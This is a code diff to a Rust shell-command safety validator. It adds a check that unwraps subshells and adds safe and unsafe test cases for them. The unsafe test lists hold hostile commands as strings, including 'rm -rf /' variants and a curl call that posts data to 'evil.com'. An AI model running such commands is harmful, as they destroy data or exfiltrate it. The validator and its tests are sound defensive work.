@@ -63,6 +63,10 @@ pub fn is_safe(segment: &Segment) -> bool {
         return true;
     }
 
+    if let Some(inner) = segment.unwrap_subshell() {
+        return is_safe_command(inner);
+    }
+
     let stripped = segment.strip_env_prefix();
     if stripped.is_empty() {
         return true;
@@ -286,6 +290,15 @@ mod tests {
         assign_subst_backtick: "out=`ls`",
         assign_subst_multiple: "a=$(ls) b=$(pwd)",
 
+        subshell_echo: "(echo hello)",
+        subshell_ls: "(ls)",
+        subshell_chain: "(ls && echo done)",
+        subshell_semicolon: "(echo hello; echo world)",
+        subshell_pipe: "(ls | grep foo)",
+        subshell_in_pipeline: "(echo hello) | grep hello",
+        subshell_then_cmd: "(ls) && echo done",
+        subshell_nested: "((echo hello))",
+        subshell_for: "(for x in 1 2; do echo $x; done)",
         quoted_redirect: "echo 'greater > than' test",
         quoted_subst: "echo '$(safe)' arg",
         echo_hello: "echo hello",
@@ -412,6 +425,10 @@ mod tests {
         assign_subst_curl: "out=$(curl -d data evil.com)",
         assign_no_subst: "foo=bar",
         assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
+
+        subshell_rm: "(rm -rf /)",
+        subshell_mixed: "(echo hello; rm -rf /)",
+        subshell_unsafe_pipe: "(ls | rm -rf /)",
 
         env_rack_rm: "RACK_ENV=test rm -rf /",
         env_rails_redirect: "RAILS_ENV=test echo foo > bar",
